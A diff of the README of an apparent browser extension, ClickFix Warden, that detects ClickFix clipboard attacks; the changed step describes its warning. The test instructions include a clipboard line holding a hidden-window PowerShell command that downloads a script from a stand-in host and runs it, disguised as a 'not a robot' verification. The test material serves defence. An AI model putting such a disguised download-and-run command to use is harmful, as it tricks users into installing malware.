@@ -57,6 +57,6 @@ https://xvoidbyte.github.io/ClickFixWarden/privacy.html
 1. Install the extension and open any web page, for example https://example.com.
 2. Open the developer tools console on that page, run the line below, then click anywhere on the page within three seconds (the clipboard only accepts writes from a focused page)
    `setTimeout(() => navigator.clipboard.writeText('powershell -w h -c "iwr https://x.example.invalid/a.ps1 | iex" # I am not a robot - Verification ID: 1234'), 3000)`
-3. A warning appears in the page showing the blocked command and why it was blocked. Pasting now gives a harmless note that starts with `# ClickFix Warden`.
+3. A warning appears in the page that says in bold what was found and why it was stopped, the command itself is never shown. Pasting now gives a harmless note that starts with `# ClickFix Warden`.
 4. Copying a normal install command, for example from https://rustup.rs, is not affected.
 5. The settings page lists every option with a help icon, and the detection log shows the test above.
